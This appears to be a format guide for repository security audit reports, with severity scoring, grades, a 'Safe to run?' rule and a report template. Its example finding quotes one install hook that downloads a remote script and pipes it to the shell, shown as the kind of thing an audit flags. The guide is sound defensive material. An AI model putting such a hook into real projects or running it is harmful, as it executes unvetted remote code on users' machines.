# Report format

## Severity and points

Rate each verified finding in exactly one row. One root cause is one finding:
a `postinstall` that downloads and runs a payload is one Critical, never also
a High hook plus a Medium network call. Count a CVE once per advisory and
package, however many dependency paths reach it.

| Severity | Points | Finding types                                                                                                                                                                                                                                                                                    |
| -------- | ------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Critical | 25     | Code that exfiltrates credentials, environment, or files; a backdoor or remote-code-execution path; an install hook or auto-run entry that downloads and runs remote code                                                                                                                        |
| High     | 10     | An install hook or auto-run entry that runs shell commands or repo scripts; obfuscated code that hides network or execution behavior; reads of credential or browser paths with no stated purpose; a known CVE rated critical or high                                                            |
| Medium   | 5      | One suspicious capability with a plausible legitimate use; a known CVE rated medium; no lockfile (counted once); a dependency from a git URL or non-default registry; a likely typosquat; repo config that ignores advisories (`osv-scanner.toml` `IgnoredVulns`, `.bundler-audit.yml` `ignore`) |
| Low      | 2      | A known CVE rated low; an unmaintained dependency; a hygiene issue such as a committed test credential                                                                                                                                                                                           |

Score = 100 minus the points of every verified finding, floored at 0.

## Grade and verdict

The grade measures risk, not intent. Say "malicious" only when a Critical
finding shows it.

| Grade | Score  | Meaning                                   |
| ----- | ------ | ----------------------------------------- |
| A     | 90-100 | No significant concerns                   |
| B     | 80-89  | Minor concerns; review the flagged items  |
| C     | 70-79  | Moderate concerns; investigate before use |
| D     | 60-69  | Significant concerns                      |
| F     | 0-59   | Severe risk                               |

**Safe to run?** comes from the highest severity, not the score:

- any Critical: **NO**;
- any High: **CONDITIONAL**, naming each condition (for example "install with
  `--ignore-scripts`", "open in VS Code only in Restricted Mode");
- otherwise: **YES**.

## Report template

Use these sections in this order. Keep every section; write `No findings.` or
`Not run: <reason>.` where one is empty.

```markdown
# Security audit: <repo> at <commit sha>

## Summary

<2-3 sentences: what the repo is, the most serious finding, the verdict.>

**Grade:** <letter> (<score>/100) · **Safe to run?** <YES | NO | CONDITIONAL: conditions>

## Phases

| Phase | Result |
| --- | --- |
| 1. Pre-run and auto-run | PASS / CONDITIONAL / FAIL |
| 2. Dependencies | <n> findings: <counts by severity>; scanners run: <list> |
| 3. Install scripts | CLEAN / FLAGGED |
| 4. Pattern scan | <n> findings: <counts by category> |

## Findings

<One block per finding, Critical first, in the example's shape.>

## Not run

<Each skipped phase, missing scanner, or excluded directory, one per line.>

## Recommendations

<Specific mitigations, one per line, citing finding IDs.>
```

## Example finding

```markdown
### F1 · Critical · Install hook runs a remote script (-25)

- **Where:** `package.json:7`
- **Evidence:** `"postinstall": "curl -s https://203.0.113.7/setup.sh | sh"`
- **Context:** `setup.sh` is not in the repo; the IP is hardcoded and appears
  nowhere else. `npm install` would run whatever that server returns.
- **Verified:** read `package.json` and searched the repo for `setup.sh`
  (no hits).
- **Fix:** do not install; if needed, use `npm install --ignore-scripts` and
  report the hook upstream.
```
